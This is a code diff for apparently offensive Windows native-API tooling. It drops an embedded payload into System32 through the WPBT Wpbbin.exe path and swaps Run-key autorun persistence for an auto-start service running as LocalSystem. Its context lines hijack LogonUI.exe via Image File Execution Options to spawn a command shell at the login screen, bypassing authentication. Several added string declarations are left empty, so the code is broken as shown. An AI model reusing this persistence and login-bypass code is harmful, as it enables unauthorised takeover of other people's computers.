@@ -123,19 +123,29 @@ BOOLEAN NtFileWriteFileByOffset(HANDLE hFile, PVOID lpData, ULONG dwBufferSize, 
 void setRegistryValue(WCHAR* keyName, WCHAR* valueName, WCHAR* value, ULONG valueType)
 {
   UNICODE_STRING KeyName, ValueName;
-  HANDLE SoftwareKeyHandle;
-  ULONG Status;
+  HANDLE KeyHandle;
   OBJECT_ATTRIBUTES ObjectAttributes;
   ULONG Disposition;
-  UNICODE_STRING tempString;
-  int Result = 0;
-  WCHAR storage[256];
   RtlInitUnicodeString(&KeyName, keyName);
-  InitializeObjectAttributes(&ObjectAttributes,&KeyName,OBJ_CASE_INSENSITIVE,NULL,NULL);
-  Status = ZwCreateKey(&SoftwareKeyHandle,KEY_ALL_ACCESS,&ObjectAttributes,0,NULL,REG_OPTION_NON_VOLATILE,&Disposition);
+  InitializeObjectAttributes(&ObjectAttributes, &KeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);
+  ZwCreateKey(&KeyHandle, KEY_ALL_ACCESS, &ObjectAttributes, 0, NULL, REG_OPTION_NON_VOLATILE, &Disposition);
   RtlInitUnicodeString(&ValueName, valueName);
-  Status = ZwSetValueKey(SoftwareKeyHandle,&ValueName,0,valueType,value,(wcslen(value) + 1) * sizeof(WCHAR));
-  Status = ZwClose(SoftwareKeyHandle);
+  ZwSetValueKey(KeyHandle, &ValueName, 0, valueType, value, (wcslen(value) + 1) * sizeof(WCHAR));
+  ZwClose(KeyHandle);
+}
+
+void setRegistryValueDword(WCHAR* keyName, WCHAR* valueName, ULONG value)
+{
+  UNICODE_STRING KeyName, ValueName;
+  HANDLE KeyHandle;
+  OBJECT_ATTRIBUTES ObjectAttributes;
+  ULONG Disposition;
+  RtlInitUnicodeString(&KeyName, keyName);
+  InitializeObjectAttributes(&ObjectAttributes, &KeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);
+  ZwCreateKey(&KeyHandle, KEY_ALL_ACCESS, &ObjectAttributes, 0, NULL, REG_OPTION_NON_VOLATILE, &Disposition);
+  RtlInitUnicodeString(&ValueName, valueName);
+  ZwSetValueKey(KeyHandle, &ValueName, 0, REG_DWORD, &value, sizeof(ULONG));
+  ZwClose(KeyHandle);
 }
 
 
@@ -162,14 +172,14 @@ void NtProcessStartup( PSTARTUP_ARGUMENT Argument ){
   WCHAR storage[256];
 
   WCHAR Wpbtbin[]= L"\\??\\\\C:\\Windows\\System32\\Wpbbin.exe";
-  WCHAR PayloadFile[]= L"\\??\\\\C:\\Windows\\System32\\GrabAccess.exe";
-  WCHAR PayloadPath[]	=	L"C:\\Windows\\System32\\GrabAccess.exe";
+  WCHAR PDir[]      = ;
+  WCHAR PayloadFile[] = ;
+  WCHAR PayloadPath[] = ;
+  WCHAR ServiceKeyPath[] = ;
+  WCHAR ServiceDisplayName[] = ;
 
   WCHAR IFEO[]	=	L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LogonUI.exe";
   WCHAR IFEO_cmd[]	=	L"cmd.exe /c start explorer.exe & start netplwiz.exe & start /wait cmd.exe & reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LogonUI.exe\" /f &  ";
-
-  WCHAR AutoRun[]	=	L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
-
 
 	InitHeapMemory();
 
@@ -211,6 +221,13 @@ void NtProcessStartup( PSTARTUP_ARGUMENT Argument ){
     for(index=0;index<AppSize;index++){
       *(volatile unsigned long *)(WriteBuffer  + index ) = *(volatile unsigned long *)(byData + AppStart + index );
     }
+    HANDLE PayloadDir;
+    RtlInitUnicodeString(&str, PDir);
+    InitializeObjectAttributes(&obj, &str, OBJ_CASE_INSENSITIVE, NULL, NULL);
+    status = NtCreateFile(&PayloadDir, SYNCHRONIZE, &obj, &isb, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN_IF, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
+    if(NT_SUCCESS(status)) {
+        NtClose(PayloadDir);
+    }
     
     //Write Payload to Disk
     RtlInitUnicodeString(&str, PayloadFile);
@@ -221,8 +238,12 @@ void NtProcessStartup( PSTARTUP_ARGUMENT Argument ){
     NtClose(FileHandle);
     free(byData);
 
-    //Set AutoRun
-    setRegistryValue(AutoRun,L"GrabAccess",PayloadPath,REG_SZ);	
+    setRegistryValue(ServiceKeyPath, L"ImagePath", PayloadPath, REG_EXPAND_SZ);
+    setRegistryValue(ServiceKeyPath, L"DisplayName", ServiceDisplayName, REG_SZ);
+    setRegistryValueDword(ServiceKeyPath, L"Type", 0x10);
+    setRegistryValueDword(ServiceKeyPath, L"Start", 0x2);
+    setRegistryValueDword(ServiceKeyPath, L"ErrorControl", 0x1);
+    setRegistryValue(ServiceKeyPath, L"ObjectName", L"LocalSystem", REG_SZ);
   }
   else{
     //Hijack Logonui.exe to netplwiz.exe
